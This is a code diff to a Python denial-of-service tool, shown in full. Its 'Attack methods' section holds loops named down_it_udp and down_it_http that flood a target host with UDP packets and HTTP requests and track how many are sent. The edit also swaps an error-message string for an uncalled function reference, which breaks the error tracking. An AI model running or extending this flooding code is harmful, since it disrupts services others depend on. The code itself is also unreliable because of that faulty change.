@@ -12,6 +12,9 @@ import services
 _ctx = Context()
 
 
+###############################################
+# Attack methods
+###############################################
 def down_it_udp(_ctx: Context):
     i = 1
     while True:
@@ -23,17 +26,15 @@ def down_it_udp(_ctx: Context):
                  f'\n\n{extra_data}'.encode('utf-8')
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-        error_msg = get_server_ip_error_msg()
         try:
             sock.sendto(packet, (_ctx.host, _ctx.port))
         except socket.gaierror:
-            if error_msg not in _ctx.errors:
-                _ctx.errors.append(error_msg)
+            if get_server_ip_error_msg not in _ctx.errors:
+                _ctx.errors.append(str(get_server_ip_error_msg))
         else:
-            if error_msg in _ctx.errors:
-                _ctx.errors.remove(error_msg)
+            if get_server_ip_error_msg in _ctx.errors:
+                _ctx.errors.remove(str(get_server_ip_error_msg))
             _ctx.packets_sent += 1
-            # print(green_txt('Packet was sent'))
         sock.close()
 
         if _ctx.port:
@@ -65,7 +66,6 @@ def down_it_http(_ctx: Context):
             _ctx.connections_failed += 1
         else:
             _ctx.connections_success += 1
-            # print(green_txt('HTTP-Request was done')))
 
         _ctx.packets_sent += 1
         show_statistics(_ctx)
